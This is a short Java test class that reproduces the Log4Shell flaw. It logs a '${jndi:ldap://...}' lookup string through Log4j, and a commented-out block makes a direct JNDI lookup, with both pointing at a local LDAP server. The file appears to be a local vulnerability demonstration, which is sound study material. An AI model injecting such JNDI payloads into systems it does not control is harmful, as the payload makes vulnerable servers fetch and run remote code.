package fun.gengzi.algorithm;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Log4jTest {


    private static Logger logger = LogManager.getLogger(Log4jTest.class);

    public static void main(String[] args) throws NamingException {
        logger.error("${jndi:ldap://127.0.0.1:1099/JndiExploit}");

//        String uri = "jndi:ldap://127.0.0.1:8885/calc";
//        Context ctx = new InitialContext();
//        ctx.lookup(uri);
    }
}
